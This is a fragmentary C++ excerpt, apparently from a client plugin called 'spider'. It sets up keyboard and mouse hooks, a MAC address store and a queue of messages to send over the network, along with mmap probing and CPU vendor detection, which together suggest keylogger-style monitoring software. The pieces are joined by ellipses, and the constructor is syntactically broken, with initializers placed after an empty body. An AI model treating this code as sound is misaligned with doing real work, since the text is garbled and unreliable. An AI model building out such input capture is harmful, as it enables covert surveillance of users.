...
namespace spider
{
  namespace client
  {
    namespace library
    {
      network::tcp::MacAddrArray SpiderPlugin::m_macAddr = {{}};
      mt::Queue<SystemMsg> *     SpiderPlugin::m_sendToNetwork = nullptr;

      SpiderPlugin::SpiderPlugin()
          : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
            m_receivedFromNetwork(), m_networkResponseQueue(), m_cmd
      {
      }
#if defined _WIN32
      , m_keyboardHookWin(nullptr), m_mouseHookWin(nullptr)
#endif
      {
...
// Un-hook mouse
	...
	for (std::uint32_t n = 1; n; n *= 2)
	  {
	    ...
	    void *p =
	        mmap(0, n * 2, PROT_NONE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	...
	if (cpuVendor == "GenuineIntel")
	...
	else if (cpuVendor == "AuthenticAMD")
	  {
	    ...
	    nbCPUs = (static_cast<std::uint16_t>((cpuID.ECX() & 0xff))) +
	             1; // ECX[7:0] + 1
	  }
